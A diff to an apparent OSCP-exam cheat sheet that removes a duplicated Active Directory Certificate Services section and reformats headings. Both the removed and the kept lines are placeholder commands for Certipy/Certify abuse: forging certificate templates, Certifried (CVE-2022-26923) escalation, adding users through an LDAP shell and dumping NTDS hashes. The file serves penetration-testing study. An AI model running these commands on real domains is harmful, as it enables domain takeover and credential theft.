@@ -112,7 +112,6 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 		- [MSL / Polyglot Attack](https://github.com/0xsyr0/OSCP#msl--polyglot-attack)
 		- [Metasploit](https://github.com/0xsyr0/OSCP#metasploit)
 	- [Post Exploitation](https://github.com/0xsyr0/OSCP#post-exploitation-1)
-		- [Active Directory Certificate Services (ADCS)](https://github.com/0xsyr0/OSCP#active-directory-certificate-services-adcs)
 		- [AMSI](https://github.com/0xsyr0/OSCP#amsi)
 		- [AppLocker Bypass List](https://github.com/0xsyr0/OSCP#applocker-bypass-list)
 		- [autologon](https://github.com/0xsyr0/OSCP#autologon)
@@ -2485,82 +2484,6 @@ meterpreter > download *
 
 ### Post Exploitation
 
-#### Active Directory Certificate Services (ADCS)
-
-##### Certifried: Active Directory Domain Privilege Escalation (CVE-2022-26923)
-
-```c
-$ certipy account create -username <USERNAME>@<DOMAIN> -password <PASSWORD> -dc-ip <RHOST> -dns <DOMAIN_CONTROLLER_DNS_NAME> -user <COMPUTERNAME>
-$ certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <FQDN> -template <TEMPLATE> -dc-ip <RHOST>
-$ certipy auth -pfx ./<CERTIFICATE>.pfx -dc-ip <RHOST>
-$ crackmapexec smb <RHOST> -u <USERNAME> -H <NTLMHASH> --ntds
-```
-
-##### Certify
-
-> https://github.com/GhostPack/Certify
-
-```c
-PS: C:\> Certify find
-```
-
-##### Certipy
-
-> https://github.com/ly4k/Certipy
-
-> https://github.com/ly4k/BloodHound/
-
-```c
-$ certipy find -dc-ip <RHOST> -u <USERNAME>@<DOMAIN> -p <PASSWORD>
-```
-
-###### Account Creation
-
-```c
-$ certipy account create -username <USERNAME>@<DOMAIN> -password <PASSWORD> -dc-ip <RHOST> -dns <DOMAIN_CONTROLLER_DNS_NAME> -user <COMPUTERNAME>
-```
-
-###### Authentication
-
-```c
-$ certipy auth -pfx <FILE>.pfx -dc-ip <RHOST> -u <USERNAME> -domain <DOMAIN>
-```
-
-###### LDAP-Shell
-
-```c
-$ certipy auth -pfx <FILE>.pfx -dc-ip <RHOST> -u <USERNAME> -domain <DOMAIN> -ldap-shell
-```
-
-```c
-# add_user <USERNAME>
-# add_user_to_group <GROUP>
-```
-
-###### Certificate Forging
-
-```c
-$ certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template Web -dc-ip <RHOST> -save-old
-```
-
-###### Certificate Request
-
-Run the following command twice because of a current issue with `certipy`.
-
-```c
-$ certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <FQDN> -template <TEMPLATE> -dc-ip <RHOST>
-```
-
-```c
-$ certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <FQDN> -template <TEMPLATE> -dc-ip <RHOST> -upn <USERNAME>@<DOMAIN> -dns <FQDN>
-```
-
-##### Start BloodHound Fork
-
-```c
-$ ./BloodHound --disable-gpu-sandbox
-```
-
 #### AMSI
 
 ```c
@@ -2650,21 +2573,17 @@ PS: C:\> Certify find
 
 > https://github.com/ly4k/BloodHound/
 
-##### Common Commands
-
 ```c
 $ certipy find -dc-ip <RHOST> -u <USERNAME>@<DOMAIN> -p <PASSWORD>
 ```
 
-##### Certificate Handling
-
-###### Account Creation
+##### Account Creation
 
 ```c
 $ certipy account create -username <USERNAME>@<DOMAIN> -password <PASSWORD> -dc-ip <RHOST> -dns <DOMAIN_CONTROLLER_DNS_NAME> -user <COMPUTERNAME>
 ```
 
-###### Authentication
+##### Authentication
 
 ```c
 $ certipy auth -pfx <FILE>.pfx -dc-ip <RHOST> -u <USERNAME> -domain <DOMAIN>
@@ -2681,13 +2600,13 @@ $ certipy auth -pfx <FILE>.pfx -dc-ip <RHOST> -u <USERNAME> -domain <DOMAIN> -ld
 # add_user_to_group <GROUP>
 ```
 
-###### Certificate Forging
+##### Certificate Forging
 
 ```c
 $ certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template Web -dc-ip <RHOST> -save-old
 ```
 
-###### Certificate Request
+##### Certificate Request
 
 Run the following command twice because of a current issue with `certipy`.
 
